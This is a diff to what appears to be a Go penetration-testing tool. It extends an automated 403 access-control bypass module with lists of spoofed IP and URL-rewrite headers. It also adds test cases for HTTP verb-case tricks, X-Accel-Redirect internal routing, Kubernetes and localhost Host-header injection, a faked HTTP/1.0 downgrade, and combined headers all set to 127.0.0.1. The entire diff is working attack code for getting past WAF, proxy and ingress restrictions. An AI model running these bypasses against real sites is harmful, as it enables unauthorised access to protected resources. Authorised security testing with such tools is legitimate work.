@@ -11,7 +11,9 @@ import (
 )
 
 // bypassIPHeaders 用于 IP 伪造的请求头
+// ref: iamj0ker/bypass-403, nomore403 headers file, CSDN 20个403 bypass
 var bypassIPHeaders = []string{
+	// 经典 XFF 系列
 	"X-Forwarded-For",
 	"X-Forward-For",
 	"X-Forwarded",
@@ -20,6 +22,9 @@ var bypassIPHeaders = []string{
 	"X-Forwarded-Server",
 	"Forwarded-For",
 	"Forwarded",
+	"X-Forwarded-For-Original",
+	"X-Forwarder-For",
+	// IP 标识头
 	"X-Originating-IP",
 	"X-Remote-IP",
 	"X-Remote-Addr",
@@ -33,7 +38,30 @@ var bypassIPHeaders = []string{
 	"X-ProxyUser-Ip",
 	"X-Original-Remote-Addr",
 	"CF-Connecting-IP",
+	"Fastly-Client-Ip",
 	"X-Host",
+	"Real-Ip",
+	// nomore403 新增头
+	"Base-Url",
+	"Http-Url",
+	"Proxy-Url",
+	"X-Proxy-Url",
+	"X-Arbitrary",
+	"X-Originally-Forwarded-For",
+	"Redirect",
+	"X-WAP-Profile",
+	"Profile",
+	"Destination",
+	"Request-Uri",
+	"Uri",
+	"Url",
+	"X-Forward",
+	"X-HTTP-DestinationURL",
+	"X-HTTP-Host-Override",
+	"Proxy",
+	"Proxy-Host",
+	"Origin",
+	"X-Referrer",
 }
 
 // bypassIPValues 伪造 IP 值（含 IPv6、编码变体、scheme 前缀）
@@ -66,10 +94,13 @@ var bypassIPValues = []string{
 }
 
 // bypassPathHeaders 用于路径重写的请求头
+// ref: nomore403, 403权限绕过另类思路
 var bypassPathHeaders = []string{
 	"X-Original-URL",
 	"X-Rewrite-URL",
 	"X-Override-URL",
+	"X-Accel-Redirect",  // Nginx 内部重定向头（ref: 403权限绕过另类思路）
+	"X-Forwarded-Path",  // 路径转发头
 }
 
 // methodOverrideHeaders 方法覆盖头
@@ -295,7 +326,106 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 		desc: "Combo[OrigURL+CustomIP+XFF]",
 	})
 
-	// 12. 智能 HTTP 方法测试: 先 GET/POST，都被拦截则 OPTIONS 探测后精准测试
+	// 13. Verb-Case 切换（ref: nomore403, 403权限绕过另类思路）
+	// 某些 WAF/中间件对 HTTP 方法大小写敏感，变体可绕过
+	verbCaseVariants := []string{"gEt", "GeT", "GEt", "gET", "get", "Get"}
+	for _, verb := range verbCaseVariants {
+		cases = append(cases, testCase{
+			method:  verb,
+			url:     url + auth,
+			headers: nil,
+			desc:    fmt.Sprintf("VerbCase[%s]", verb),
+		})
+	}
+
+	// 14. X-Accel-Redirect + Nginx 内部路由组合（ref: 403权限绕过另类思路）
+	// Nginx 的 X-Accel-Redirect 可触发内部 location 跳转，绕过前端 ACL
+	cases = append(cases, testCase{
+		method:  "GET",
+		url:     url + noauth,
+		headers: map[string]string{"X-Accel-Redirect": auth},
+		desc:    fmt.Sprintf("X-Accel-Redirect[%s]", auth),
+	})
+	// 配合内部路径
+	cases = append(cases, testCase{
+		method:  "GET",
+		url:     url + "/",
+		headers: map[string]string{"X-Accel-Redirect": "/internal" + auth},
+		desc:    fmt.Sprintf("X-Accel-Redirect[/internal%s]", auth),
+	})
+
+	// 15. k8s / 服务网格 Host 注入（ref: 403权限绕过另类思路）
+	// k8s 环境中可通过注入内部 Service Host 绕过 Ingress 层的访问控制
+	k8sHosts := []string{
+		"kubernetes.default.svc",
+		"localhost:8080",
+		"127.0.0.1:8443",
+		"0.0.0.0:80",
+		"[::1]:8080",
+	}
+	for _, kh := range k8sHosts {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{"Host": kh},
+			desc:    fmt.Sprintf("K8sHost[%s]", kh),
+		})
+	}
+
+	// 16. HTTP/1.0 降级模拟（ref: nomore403, 403权限绕过另类思路）
+	// 某些 WAF/反代只检查 HTTP/1.1，HTTP/1.0 请求可绕过
+	// Go 的 net/http 不直接支持设置 HTTP 版本，但我们可以通过 header 模拟
+	// 部分中间件通过 Via 头判断协议版本
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"Via":            "1.0 localhost",
+			"X-Forwarded-Proto": "http",
+		},
+		desc: "HTTPDowngrade[Via:1.0+Proto:http]",
+	})
+
+	// 17. 扩展多头组合攻击（ref: nomore403, 403权限绕过另类思路）
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"X-Forwarded-For":    "127.0.0.1",
+			"X-Real-IP":          "127.0.0.1",
+			"X-Original-URL":     auth,
+			"X-Rewrite-URL":      auth,
+			"X-Forwarded-Proto":  "https",
+		},
+		desc: "Combo[XFF+RealIP+OrigURL+RewriteURL+Proto]",
+	})
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + noauth,
+		headers: map[string]string{
+			"X-Original-URL":    auth,
+			"X-Accel-Redirect":  auth,
+			"X-Forwarded-For":   "127.0.0.1",
+		},
+		desc: "Combo[OrigURL+Accel+XFF via noauth]",
+	})
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"X-Forwarded-For":       "127.0.0.1",
+			"X-Forwarded-Host":      "localhost",
+			"X-Forwarded-Proto":     "https",
+			"X-Forwarded-Port":      "443",
+			"X-Real-IP":             "127.0.0.1",
+			"True-Client-IP":        "127.0.0.1",
+			"CF-Connecting-IP":      "127.0.0.1",
+			"X-Custom-IP-Authorization": "127.0.0.1",
+		},
+		desc: "Combo[AllIPHeaders=127.0.0.1]",
+	})
+
+	// 18. 智能 HTTP 方法测试: 先 GET/POST，都被拦截则 OPTIONS 探测后精准测试
 	methodCases := discoverAndBuildMethodCases(url+auth, origLen, origCode, debug)
 	cases = append(cases, methodCases...)
 
